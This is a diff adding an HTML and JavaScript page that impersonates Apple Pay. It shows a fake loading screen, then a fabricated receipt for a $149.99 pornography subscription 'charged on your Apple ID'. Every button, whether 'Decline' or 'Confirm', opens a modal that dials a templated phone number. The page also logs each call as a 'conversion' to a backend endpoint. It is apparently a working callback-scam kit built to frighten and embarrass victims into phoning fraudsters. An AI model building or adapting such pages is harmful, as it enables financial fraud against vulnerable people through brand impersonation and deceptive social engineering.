@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Pay Processing</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            overflow-x: hidden;
+            margin: 0;
+        }
+
+        /* =========================================
+           LOADING SCREEN STYLES
+           ========================================= */
+        #loading-screen {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100vh;
+            background: #ffffff;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .loader-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .apple-icon-white {
+            width: 32px;
+            fill: #000;
+        }
+
+        .loader-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #000;
+        }
+
+        .processing-text {
+            font-size: 1rem;
+            color: #666;
+            margin-bottom: 30px;
+            animation: pulseText 1.5s infinite;
+        }
+
+        @keyframes pulseText {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        /* Standard iOS Spinner */
+        .spinner {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-top: 3px solid #000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 40px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loader-footer {
+            position: absolute;
+            bottom: 40px;
+            font-size: 0.8rem;
+            color: #999;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .loader-footer svg {
+            width: 14px;
+            height: 14px;
+            fill: #999;
+        }
+
+        /* =========================================
+           RECEIPT SCREEN STYLES (SOFT GRADIENT)
+           ========================================= */
+        #receipt-wrapper {
+            display: none; /* Hidden initially */
+            min-height: 100vh;
+            background: linear-gradient(135deg, #eef2f3 0%, #dceefc 100%);
+            padding: 40px 20px;
+            opacity: 0;
+            transition: opacity 0.8s ease-in;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .merchant-name {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #000;
+            letter-spacing: 0.5px;
+        }
+
+        /* Card */
+        .card {
+            background: #ffffff;
+            border-radius: 16px;
+            padding: 32px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
+        }
+
+        .status-badge {
+            text-align: center;
+            margin-bottom: 20px;
+            display: inline-block;
+            background: #e6f9ec;
+            color: #34a853;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        h1 {
+            font-size: 1.4rem;
+            text-align: center;
+            margin-bottom: 6px;
+            color: #1c1c1e;
+        }
+
+        .sub-text {
+            text-align: center;
+            color: #8e8e93;
+            font-size: 0.9rem;
+            margin-bottom: 30px;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #d2d2d7;
+            margin: 20px 0;
+        }
+
+        /* Items */
+        .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: baseline;
+            margin-bottom: 10px;
+            color: #1c1c1e;
+        }
+        
+        .qty-row { font-size: 0.85rem; color: #8e8e93; }
+
+        .desc-block {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #6e6e73;
+            line-height: 1.5;
+            background: #fafafa;
+            padding: 12px;
+            border-radius: 8px;
+        }
+
+        .total-section { margin-top: 20px; padding-top: 10px; }
+
+        .grand-total {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #000;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            margin-top: 10px;
+        }
+
+        .payment-details {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px dashed #d2d2d7;
+        }
+
+        .pay-method {
+            font-weight: 600;
+            color: #1c1c1e;
+            margin-bottom: 4px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .txn-id {
+            font-family: monospace;
+            color: #8e8e93;
+            font-size: 0.8rem;
+        }
+
+        .date-block {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: #8e8e93;
+        }
+
+        /* Authorization Section */
+        .auth-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        .btn-group-page {
+            display: flex;
+            gap: 12px;
+            margin-top: 15px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 10px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            font-size: 0.95rem;
+            transition: opacity 0.2s;
+        }
+        .btn:hover { opacity: 0.9; }
+
+        .btn-decline-page { background: #fff; color: #ff3b30; border: 1px solid #ff3b30; }
+        .btn-confirm-page { background: #007aff; color: white; box-shadow: 0 4px 10px rgba(0, 122, 255, 0.3); }
+
+        /* CUSTOM MODAL */
+        #global-confirm-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content-box {
+            background: #fff;
+            padding: 24px;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 320px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
+            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        .gc-btn {
+            width: 100%; padding: 12px; margin-top: 10px;
+            border-radius: 10px; font-size: 1rem; font-weight: 700;
+            cursor: pointer; border: none;
+        }
+        .btn-call { background-color: #007AFF; color: white; }
+        .btn-decline-mod { background-color: #f2f2f7; color: #ff3b30; }
+
+    </style>
+</head>
+<body>
+
+    <!-- ========================
+         LOADING SCREEN
+         ======================== -->
+    <div id="loading-screen">
+        <div class="loader-header">
+            <!-- Apple Icon -->
+            <svg class="apple-icon-white" viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-24.8 47.3-24.8 47.3-37.4 3.9-68.8 43.6-70.2 45.2-33 1.8-70.2 54.4-70.2 54.4 60.4 37.5 121.6 22.6 140.8 22.6 20.8 0 38.7-20.5 38.7-20.5-20.6-19.5-24.2-49.8-24.2-49.8z"/></svg>
+            <span class="loader-title">Apple Pay</span>
+        </div>
+        
+        <div class="processing-text">Your payment is being processed</div>
+        
+        <div class="spinner"></div>
+
+        <div class="loader-footer">
+            Payment powered by
+            <span style="font-weight: 600;">
+                <svg viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-24.8 47.3-24.8 47.3-37.4 3.9-68.8 43.6-70.2 45.2-33 1.8-70.2 54.4-70.2 54.4 60.4 37.5 121.6 22.6 140.8 22.6 20.8 0 38.7-20.5 38.7-20.5-20.6-19.5-24.2-49.8-24.2-49.8z"/></svg>
+                Apple Pay
+            </span>
+        </div>
+    </div>
+
+    <!-- ========================
+         RECEIPT WRAPPER (Hidden until loaded)
+         ======================== -->
+    <div id="receipt-wrapper">
+        <div class="wrapper">
+            
+            <!-- HEADER LOGO -->
+            <div class="header">
+                <svg class="apple-icon-white" style="margin-bottom:8px;" viewBox="0 0 384 512"><path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-24.8 47.3-24.8 47.3-37.4 3.9-68.8 43.6-70.2 45.2-33 1.8-70.2 54.4-70.2 54.4 60.4 37.5 121.6 22.6 140.8 22.6 20.8 0 38.7-20.5 38.7-20.5-20.6-19.5-24.2-49.8-24.2-49.8z"/></svg>
+                <div class="merchant-name">apple.com</div>
+            </div>
+
+            <!-- MAIN CARD -->
+            <div class="card">
+                
+                <div class="status-badge">Payment successful!</div>
+                <h1>Your Order has been Confirmed</h1>
+                <p class="sub-text">Summary</p>
+
+                <div class="row">
+                    <span>Pornhub Subscription</span>
+                    <strong>$139.99</strong>
+                </div>
+                <!-- <div class="row qty-row">
+                    <span>Matte Black · Qty: 1</span>
+                </div> -->
+
+                <div class="desc-block">
+                    A Pre-authorised Transaction of $149.99 has been charged on your Apple ID via Apple Pay, in regards to the purchase done at pornhub.com for pornographic content.
+                    If you don't recognize the transaction, then click on Decline button to report the transaction immediately at <%= phone %>.
+                </div>
+
+                <div class="total-section">
+                    <div class="row">
+                        <span>Subtotal</span>
+                        <span>$139.99</span>
+                    </div>
+                    <div class="row">
+                        <span>Tax</span>
+                        <span>$10.00</span>
+                    </div>
+                    <div class="row grand-total">
+                        <span>Total Paid</span>
+                        <span>$149.99</span>
+                    </div>
+                </div>
+
+                <div class="payment-details">
+                    <div class="pay-method">
+                        <span>Paid via Apple Pay •••• 5583</span>
+                        <span id="txn-id">TXN-LOADING...</span>
+                    </div>
+                </div>
+
+                <div class="date-block">
+                    <div id="time-display"></div>
+                    <div id="date-display"></div>
+                </div>
+
+                <!-- AUTHORIZATION SECTION -->
+                <div class="auth-section">
+                    <p style="text-align:center; font-weight:600; color:#333;">Do you authorize this transaction?</p>
+                    <div class="btn-group-page">
+                        <button class="btn btn-decline-page" onclick="triggerConfirmation()">No, Decline</button>
+                        <button class="btn btn-confirm-page" onclick="triggerConfirmation()">Yes, Confirm</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- CUSTOM MODAL HTML (Injected by JS) -->
+    <div id="global-confirm-modal" style="display:none;">
+        <div class="modal-content-box">
+            <div class="modal-title" style="margin-bottom:10px; font-weight:700;">Confirm Action</div>
+            <div class="modal-message" id="dynamic-demo-text" style="font-size:0.9rem; color:#666; margin-bottom:20px;"></div>
+            <button class="gc-btn btn-call" onclick="executeAction()">Call</button>
+            <button class="gc-btn btn-decline-mod" onclick="executeAction()">Decline</button>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // 1. CORE VARIABLES (Keep Intact As Requested)
+        // ==========================================
+        var potentialPhone = "<%= phone %>"; 
+        var finalPhoneNumber = (potentialPhone === "<%= phone %>") ? "+1800-000-0000" : potentialPhone;
+        
+        const demoMessage = "A suspicious pre-authorised transaction has been charged on your Apple ID, to purchase some pornographic content, if you dont recognize the transaction,get in touch with us immediately at <%= phone %>, click on Call to get in touch right now and report the fraudent act";
+
+        // ==========================================
+        // 2. LOAD SEQUENCE
+        // ==========================================
+        document.addEventListener("DOMContentLoaded", () => {
+            // Set Random Transaction ID
+            function generateId(len) {
+                return Math.random().toString(36).substring(2, 15).toUpperCase();
+            }
+            document.getElementById('txn-id').textContent = 'TXN-2026' + new Date().getFullYear() + '-' + generateId(6);
+
+            // Static Clock
+            const now = new Date();
+            document.getElementById('date-display').textContent = now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+            document.getElementById('time-display').textContent = now.toLocaleTimeString('en-US');
+
+            // Populate Modal Message
+            document.getElementById('dynamic-demo-text').innerText = demoMessage;
+
+            // Simulate Loading Time (3 Seconds)
+            setTimeout(() => {
+                const loader = document.getElementById('loading-screen');
+                const receipt = document.getElementById('receipt-wrapper');
+                
+                loader.style.opacity = '0';
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    receipt.style.display = 'block';
+                    
+                    // Trigger reflow to animate
+                    void receipt.offsetWidth; 
+                    
+                    receipt.style.opacity = '1';
+                }, 500);
+            }, 3000);
+        });
+
+        // ==========================================
+        // 3. TRACKING FUNCTION
+        // ==========================================
+        function trackCallClick() {
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', '/api/convert/call', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send('{}');
+            } catch(e) {}
+        }
+
+        // ==========================================
+        // 4. AUTHENTICATION & CALL LOGIC
+        // ==========================================
+        function triggerConfirmation() {
+            document.getElementById('global-confirm-modal').style.display = 'flex';
+        }
+
+        function executeAction() {
+            document.getElementById('global-confirm-modal').style.display = 'none';
+            
+            console.log("Initiating call to " + finalPhoneNumber + "...");
+            
+            // Place Call
+            const link = document.createElement('a');
+            link.href = `tel:<%= phone %>`;
+            link.click();
+            
+            // Report Tracking
+            trackCallClick();
+        }
+
+        // Close Modal on outside click
+        window.onclick = function(event) {
+            if (event.target == document.getElementById('global-confirm-modal')) {
+                event.target.style.display = "none";
+            }
+        }
+    </script>
+
+</body>
+</html>
